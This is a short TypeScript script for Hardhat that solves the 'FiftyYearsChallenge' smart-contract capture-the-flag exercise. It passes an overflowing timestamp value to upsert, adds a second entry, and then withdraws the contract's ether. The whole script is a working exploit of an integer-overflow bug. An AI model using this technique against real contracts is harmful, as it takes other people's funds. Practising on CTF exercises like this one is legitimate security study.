import { ethers } from "hardhat";

const solve = async () => {
  const challengeAddress = "0xe53c4CA2BBa9FA1511B6fb4df03c81Cd5d11d30A";
  const [player] = await ethers.getSigners();

  const challengeContract = await ethers.getContractAt(
    "FiftyYearsChallenge",
    challengeAddress,
    player
  );

  let tx = await challengeContract.upsert(
    1,
    ethers.constants.MaxUint256.sub(86399),
    {
      value: 1,
    }
  );
  console.log(await tx.wait());

  tx = await challengeContract.upsert(2, 0, { value: 1 });
  console.log(await tx.wait());

  tx = await challengeContract.withdraw(1);
  console.log(await tx.wait());
};

solve().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
